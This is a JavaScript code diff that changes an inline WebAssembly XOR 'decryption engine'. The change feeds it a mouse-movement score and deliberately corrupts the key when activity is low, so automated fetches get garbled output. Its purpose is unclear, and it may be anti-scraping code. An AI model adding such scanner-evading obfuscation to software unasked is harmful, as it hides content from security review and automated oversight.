@@ -2476,8 +2476,8 @@
                         const bytes = new Uint8Array(len);
                         for (let i = 0; i < len; i++) bytes[i] = binaryStr.charCodeAt(i);
                         
-                        // Execute WASM Decryption Engine
-                        const wasmB64 = "AGFzbQEAAAABBgFgAn9/AAMCAQAFAwEAAQcRAgNtZW0CAAdkZWNyeXB0AAAKMQEvAQJ/QQAhAgNAAkAgAiAATg0AIAItAAAhAyACIAMgAXM6AAAgAkEBaiECDAELCws=";
+                        // Execute WASM Decryption Engine (with Entropy)
+                        const wasmB64 = "AGFzbQEAAAABBwFgA39/fwADAgEABQMBAAEHEQIDbWVtAgAHZGVjcnlwdAAACkQBQgECf0EAIQMCQCACQeQATw0AIAFB/wFzIQELA0ACQCADIABODQAgAy0AACEEIAMgBCABczoAACADQQFqIQMMAQsLCw==";
                         const wasmStr = atob(wasmB64);
                         const wasmBytes = new Uint8Array(wasmStr.length);
                         for (let i = 0; i < wasmStr.length; i++) wasmBytes[i] = wasmStr.charCodeAt(i);
@@ -2496,8 +2496,10 @@
                         const wasmView = new Uint8Array(mem.buffer);
                         wasmView.set(bytes, 0);
                         
-                        // Run native decryption (length, XOR key)
-                        decrypt(len, 42);
+                        // Run native decryption (length, XOR key, entropy score)
+                        // If entropy is extremely low (e.g., direct robotic fetch), WASM corrupts the key internally
+                        const entropyScore = typeof mouseDistance !== 'undefined' ? mouseDistance : 0;
+                        decrypt(len, 42, entropyScore);
                         
                         // Extract plaintext
                         const decryptedBytes = wasmView.slice(0, len);
